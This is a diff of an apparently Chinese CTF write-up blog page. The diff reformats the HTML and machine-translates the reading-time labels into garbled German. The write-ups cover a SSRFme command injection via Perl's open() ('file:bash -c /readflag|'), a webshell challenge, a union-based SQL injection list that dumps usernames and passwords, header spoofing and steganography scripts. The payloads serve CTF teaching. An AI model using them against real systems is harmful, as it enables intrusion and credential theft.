@@ -118,7 +118,7 @@
                 
                 
                 
-                <a class="navbar-item search" title="Search" href="javascript:;">
+                <a class="navbar-item search" title="Suche" href="javascript:;">
                     <i class="fas fa-search"></i>
                 </a>
                 
@@ -158,7 +158,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    a minute read (About 127 words)
+                    a minute lesen (Über 127 Worte)
                 </span>
                 
                 
@@ -171,7 +171,14 @@
             
         </h1>
         <div class="content">
-            <p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>查看源代码找到一串base32，解码得：suctf{hAHaha_Fak3_F1ag}，显然是个假的flag。</strong><br><img src="/2-7-SUCTF-2019-Game/1.png" class title="This is an test image"><br><strong>接着在图片中寻找，找到一个des加密的字符串：U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==</strong><br><img src="/2-7-SUCTF-2019-Game/2.png" class title="This is an test image"><br>DES加密的字符串都是以<strong>U2FsdGVkX1</strong>开头的。<br>用在线网站解码des，使用3DES解码：密码为假的flag<br><img src="/2-7-SUCTF-2019-Game/3.png" class title="This is an test image"><br>得到flag：flag{U_F0und_1t}</p>
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<p><strong>查看源代码找到一串base32，解码得：suctf{hAHaha_Fak3_F1ag}，显然是个假的flag。</strong></p>
+<img src="/2-7-SUCTF-2019-Game/1.png" class title="This is an test image">
+<p><strong>接着在图片中寻找，找到一个des加密的字符串：U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==</strong></p>
+<img src="/2-7-SUCTF-2019-Game/2.png" class title="This is an test image">
+<p>DES加密的字符串都是以<strong>U2FsdGVkX1</strong>开头的。<br>用在线网站解码des，使用3DES解码：密码为假的flag</p>
+<img src="/2-7-SUCTF-2019-Game/3.png" class title="This is an test image">
+<p>得到flag：flag{U_F0und_1t}</p>
 
         </div>
         
@@ -206,7 +213,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    4 minutes read (About 539 words)
+                    4 minutes lesen (Über 539 Worte)
                 </span>
                 
                 
@@ -219,9 +226,24 @@
             
         </h1>
         <div class="content">
-            <p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>首先拿到源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;</span><br><span class="line">        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);</span><br><span class="line">        $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">    $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><br>主要代码是这个部分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br></pre></td></tr></table></figure><br><strong>代码逻辑为：1.创建一个’orange/客户端ip哈希值’的目录；2.将传入的URL带入命令GET执行 — GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求；3.解析filename参数，传入filename的最后一级文件夹（获取不为空）并创建。</strong><br><img src="/2-7-HITCON-2017-SSRFme/1.png" class title="This is an test image"></p>
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<p><strong>首先拿到源码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;</span><br><span class="line">        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);</span><br><span class="line">        $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">    $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+<p>主要代码是这个部分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br></pre></td></tr></table></figure>
+<p><strong>代码逻辑为：1.创建一个’orange/客户端ip哈希值’的目录；2.将传入的URL带入命令GET执行 — GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求；3.解析filename参数，传入filename的最后一级文件夹（获取不为空）并创建。</strong></p>
+<img src="/2-7-HITCON-2017-SSRFme/1.png" class title="This is an test image">
+
 <hr>
-<p><strong>解法有很多，但是我在做的时候主要用的open()函数绕过检测机制的方法。</strong><br><strong>首先通过上面代码的逻辑访问网站根目录：<br>创建一个名为a的文件，通过url参数访问根目录，那么访问的信息就会存储在a文件下。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&amp;filename&#x3D;a</span><br><span class="line">sandbox&#x2F;0a3519231615f5dcb5681b439c71d89c&#x2F;a</span><br></pre></td></tr></table></figure><br><img src="/2-7-HITCON-2017-SSRFme/2.png" class title="This is an test image"><br>看到有个readflag。<br>其次用到了perl语言的open函数参数是可控的，可以执行任意命令。<br><strong>这里要明确一点perl的GET命令是调用open函数来实现执行命令的。</strong><br>下面是截取别的大佬博客wp中的一段：<br><img src="/2-7-HITCON-2017-SSRFme/3.png" class title="This is an test image"><br><strong>这个意思有两点：1.在file.pm中open函数参数可控；2.file.pm先判断(file:文件名)中的文件是否存在，才能执行文件名对应的命令。</strong><br>所以最终的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;bash -c &#x2F;readflag|  创建相应的同名文件。</span><br><span class="line">url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;da4er   利用open执行代码。</span><br><span class="line">最后直接访问&#x2F; sandbox &#x2F;哈希值&#x2F; 123就能得到flag。</span><br></pre></td></tr></table></figure><br><img src="/2-7-HITCON-2017-SSRFme/4.png" class title="This is an test image">)</p>
+<p><strong>解法有很多，但是我在做的时候主要用的open()函数绕过检测机制的方法。</strong><br><strong>首先通过上面代码的逻辑访问网站根目录：<br>创建一个名为a的文件，通过url参数访问根目录，那么访问的信息就会存储在a文件下。</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&amp;filename&#x3D;a</span><br><span class="line">sandbox&#x2F;0a3519231615f5dcb5681b439c71d89c&#x2F;a</span><br></pre></td></tr></table></figure>
+<img src="/2-7-HITCON-2017-SSRFme/2.png" class title="This is an test image">
+<p>看到有个readflag。<br>其次用到了perl语言的open函数参数是可控的，可以执行任意命令。<br><strong>这里要明确一点perl的GET命令是调用open函数来实现执行命令的。</strong><br>下面是截取别的大佬博客wp中的一段：</p>
+<img src="/2-7-HITCON-2017-SSRFme/3.png" class title="This is an test image">
+<p><strong>这个意思有两点：1.在file.pm中open函数参数可控；2.file.pm先判断(file:文件名)中的文件是否存在，才能执行文件名对应的命令。</strong><br>所以最终的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;bash -c &#x2F;readflag|  创建相应的同名文件。</span><br><span class="line">url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;da4er   利用open执行代码。</span><br><span class="line">最后直接访问&#x2F; sandbox &#x2F;哈希值&#x2F; 123就能得到flag。</span><br></pre></td></tr></table></figure>
+<img src="/2-7-HITCON-2017-SSRFme/4.png" class title="This is an test image">)
+
 <hr>
 <p>参考博客：<br><a href="https://www.jianshu.com/p/3f82685f56a8">1</a><br><a href="http://momomoxiaoxi.com/2017/11/08/HITCON/">2</a></p>
 
@@ -258,7 +280,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    2 minutes read (About 236 words)
+                    2 minutes lesen (Über 236 Worte)
                 </span>
                 
                 
@@ -271,12 +293,21 @@
             
         </h1>
         <div class="content">
-            <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
-<h3 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h3><p><strong>题目提示找到shell，shell密码都给了，直接用菜刀连接，得到flag。</strong><br><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/1.png" class title="This is an test image"></p>
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<h3 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h3><p><strong>题目提示找到shell，shell密码都给了，直接用菜刀连接，得到flag。</strong></p>
+<img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/1.png" class title="This is an test image">
+
 <hr>
-<h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p><strong>简单的sql注入题目，没用任何过滤机制。所以使用最简单的sql注入语句即可。</strong><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;1 --+</span><br><span class="line">and 1&#x3D;2 --+</span><br><span class="line">order by 3 --+</span><br><span class="line">union select 1,2,3 --+</span><br><span class="line">union select 1,database(),version() --+</span><br><span class="line">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</span><br><span class="line">union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; --+</span><br><span class="line">union select 1,username,password from users limit 0，1--+ or (union select 1,2,group_concat(concat_ws(&#39;:&#39;,username,password)) from users --+)</span><br></pre></td></tr></table></figure><br>将对应的表名换成题目中的表名即可<br><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/2.png" class title="This is an test image"></p>
+<h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p><strong>简单的sql注入题目，没用任何过滤机制。所以使用最简单的sql注入语句即可。</strong><br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;1 --+</span><br><span class="line">and 1&#x3D;2 --+</span><br><span class="line">order by 3 --+</span><br><span class="line">union select 1,2,3 --+</span><br><span class="line">union select 1,database(),version() --+</span><br><span class="line">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</span><br><span class="line">union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; --+</span><br><span class="line">union select 1,username,password from users limit 0，1--+ or (union select 1,2,group_concat(concat_ws(&#39;:&#39;,username,password)) from users --+)</span><br></pre></td></tr></table></figure>
+<p>将对应的表名换成题目中的表名即可</p>
+<img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/2.png" class title="This is an test image">
+
 <hr>
-<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p><strong>这道题目主要考察http头部信息的理解和利用。</strong><br><strong>首先查看源码找到Secret.php</strong><br><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/3.png" class title="This is an test image"><br><strong>接下来就是https头部的构造了，如图构造了三个http头部信息：User-Agent；Referer；X-Forwared-For。</strong><br><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/4.png" class title="This is an test image"></p>
+<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p><strong>这道题目主要考察http头部信息的理解和利用。</strong><br><strong>首先查看源码找到Secret.php</strong></p>
+<img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/3.png" class title="This is an test image">
+<p><strong>接下来就是https头部的构造了，如图构造了三个http头部信息：User-Agent；Referer；X-Forwared-For。</strong></p>
+<img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/4.png" class title="This is an test image">
 
         </div>
         
@@ -311,7 +342,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    2 minutes read (About 267 words)
+                    2 minutes lesen (Über 267 Worte)
                 </span>
                 
                 
@@ -324,8 +355,16 @@
             
         </h1>
         <div class="content">
-            <p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>先binwalk分离图片的压缩包：</strong><br><img src="/GXYCTF2019-gakki/1.png" class title="This is an test image"><br><strong>得到的压缩包有密码，尝试爆破。</strong><br><img src="/GXYCTF2019-gakki/2.png" class title="This is an test image"><br><strong>看到flag.txt有很多字符，想到字符频率，用脚本或者HxD查看都可以。</strong><br><img src="/GXYCTF2019-gakki/3.png" class title="This is an test image"><br><img src="/GXYCTF2019-gakki/4.png" class title="This is an test image"><br>附上解题脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">def processLine(line, CharacterCounts):</span><br><span class="line">    for character in line:</span><br><span class="line">        #if ord(character) in range(97, 123):</span><br><span class="line">        if ord(character) in range(32,126):</span><br><span class="line">            CharacterCounts[character] +&#x3D; 1</span><br><span class="line">  </span><br><span class="line">#创建字母字典</span><br><span class="line">def createCharacterCounts(CharacterCounts):</span><br><span class="line">    #for i in range(97, 123):</span><br><span class="line">    for i in range(32, 126):</span><br><span class="line">        CharacterCounts[chr(i)] &#x3D; 0</span><br><span class="line">  </span><br><span class="line">def main():</span><br><span class="line">    #用户输入一个文件名</span><br><span class="line">    # filename &#x3D; input(&quot;enter a filename:&quot;).strip()</span><br><span class="line">    filename &#x3D; &quot;flag.txt&quot;</span><br><span class="line">    infile &#x3D; open(filename, &quot;r&quot;)</span><br><span class="line">      </span><br><span class="line">    #建立用于计算词频的空字典</span><br><span class="line">    CharacterCounts &#x3D; &#123;&#125;</span><br><span class="line">    #初始化字典键值</span><br><span class="line">    createCharacterCounts(CharacterCounts)</span><br><span class="line">    for line in infile:</span><br><span class="line">        #processLine(line.lower(), CharacterCounts)</span><br><span class="line">        processLine(line, CharacterCounts)</span><br><span class="line">          </span><br><span class="line">    #从字典中获取数据对</span><br><span class="line">    pairs &#x3D; list(CharacterCounts.items())</span><br><span class="line">  </span><br><span class="line">    #列表中的数据对交换位置,数据对排序</span><br><span class="line">    items &#x3D; [[x,y] for (y,x) in pairs] </span><br><span class="line">    items.sort(reverse&#x3D;True)</span><br><span class="line">  </span><br><span class="line">    #输出count个数词频结果</span><br><span class="line">    for i in range(len(items)):</span><br><span class="line">        #print(items[i][1]+&quot;\t&quot;+str(items[i][0]))</span><br><span class="line">        print(items[i][1],end&#x3D;&#39;&#39;)</span><br><span class="line">          </span><br><span class="line">    infile.close()</span><br><span class="line">          </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
-
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<p><strong>先binwalk分离图片的压缩包：</strong></p>
+<img src="/GXYCTF2019-gakki/1.png" class title="This is an test image">
+<p><strong>得到的压缩包有密码，尝试爆破。</strong></p>
+<img src="/GXYCTF2019-gakki/2.png" class title="This is an test image">
+<p><strong>看到flag.txt有很多字符，想到字符频率，用脚本或者HxD查看都可以。</strong></p>
+<img src="/GXYCTF2019-gakki/3.png" class title="This is an test image">
+<img src="/GXYCTF2019-gakki/4.png" class title="This is an test image">
+<p>附上解题脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">def processLine(line, CharacterCounts):</span><br><span class="line">    for character in line:</span><br><span class="line">        #if ord(character) in range(97, 123):</span><br><span class="line">        if ord(character) in range(32,126):</span><br><span class="line">            CharacterCounts[character] +&#x3D; 1</span><br><span class="line">  </span><br><span class="line">#创建字母字典</span><br><span class="line">def createCharacterCounts(CharacterCounts):</span><br><span class="line">    #for i in range(97, 123):</span><br><span class="line">    for i in range(32, 126):</span><br><span class="line">        CharacterCounts[chr(i)] &#x3D; 0</span><br><span class="line">  </span><br><span class="line">def main():</span><br><span class="line">    #用户输入一个文件名</span><br><span class="line">    # filename &#x3D; input(&quot;enter a filename:&quot;).strip()</span><br><span class="line">    filename &#x3D; &quot;flag.txt&quot;</span><br><span class="line">    infile &#x3D; open(filename, &quot;r&quot;)</span><br><span class="line">      </span><br><span class="line">    #建立用于计算词频的空字典</span><br><span class="line">    CharacterCounts &#x3D; &#123;&#125;</span><br><span class="line">    #初始化字典键值</span><br><span class="line">    createCharacterCounts(CharacterCounts)</span><br><span class="line">    for line in infile:</span><br><span class="line">        #processLine(line.lower(), CharacterCounts)</span><br><span class="line">        processLine(line, CharacterCounts)</span><br><span class="line">          </span><br><span class="line">    #从字典中获取数据对</span><br><span class="line">    pairs &#x3D; list(CharacterCounts.items())</span><br><span class="line">  </span><br><span class="line">    #列表中的数据对交换位置,数据对排序</span><br><span class="line">    items &#x3D; [[x,y] for (y,x) in pairs] </span><br><span class="line">    items.sort(reverse&#x3D;True)</span><br><span class="line">  </span><br><span class="line">    #输出count个数词频结果</span><br><span class="line">    for i in range(len(items)):</span><br><span class="line">        #print(items[i][1]+&quot;\t&quot;+str(items[i][0]))</span><br><span class="line">        print(items[i][1],end&#x3D;&#39;&#39;)</span><br><span class="line">          </span><br><span class="line">    infile.close()</span><br><span class="line">          </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
         </div>
         
         
@@ -359,7 +398,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    a minute read (About 177 words)
+                    a minute lesen (Über 177 Worte)
                 </span>
                 
                 
@@ -372,10 +411,14 @@
             
         </h1>
         <div class="content">
-            <p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>首先打开题目发现有很多行base64，想到base64隐写。所谓的base64隐写就是通过在base64最后几个字节中隐藏信息，所以要使用很多行来存储信息。看到有很多行base64首先要想到base64隐写！</strong></p>
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<p><strong>首先打开题目发现有很多行base64，想到base64隐写。所谓的base64隐写就是通过在base64最后几个字节中隐藏信息，所以要使用很多行来存储信息。看到有很多行base64首先要想到base64隐写！</strong></p>
 <hr>
 <img src="/2-7-GXYCTF2019-Is-this-base/1.png" class title="This is an test image">
-<p>使用脚本跑即可，附上脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        bin_str = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            stegb64 = <span class="string">''</span>.join(line.split())</span><br><span class="line">            rowb64 =  <span class="string">''</span>.join(stegb64.decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).split())</span><br><span class="line">            offset = abs(b64chars.index(stegb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>])-b64chars.index(rowb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>]))</span><br><span class="line">            equalnum = stegb64.count(<span class="string">'='</span>) <span class="comment">#no equalnum no offset</span></span><br><span class="line">            <span class="keyword">if</span> equalnum:</span><br><span class="line">                bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">''</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>)])</span><br></pre></td></tr></table></figure><br><strong>得到flag</strong><br><img src="/2-7-GXYCTF2019-Is-this-base/2.png" class title="This is an test image"></p>
+<p>使用脚本跑即可，附上脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        bin_str = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            stegb64 = <span class="string">''</span>.join(line.split())</span><br><span class="line">            rowb64 =  <span class="string">''</span>.join(stegb64.decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).split())</span><br><span class="line">            offset = abs(b64chars.index(stegb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>])-b64chars.index(rowb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>]))</span><br><span class="line">            equalnum = stegb64.count(<span class="string">'='</span>) <span class="comment">#no equalnum no offset</span></span><br><span class="line">            <span class="keyword">if</span> equalnum:</span><br><span class="line">                bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">''</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>)])</span><br></pre></td></tr></table></figure>
+<p><strong>得到flag</strong></p>
+<img src="/2-7-GXYCTF2019-Is-this-base/2.png" class title="This is an test image">
 
         </div>
         
@@ -410,7 +453,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    a few seconds read (About 76 words)
+                    a few seconds lesen (Über 76 Worte)
                 </span>
                 
                 
@@ -423,7 +466,13 @@
             
         </h1>
         <div class="content">
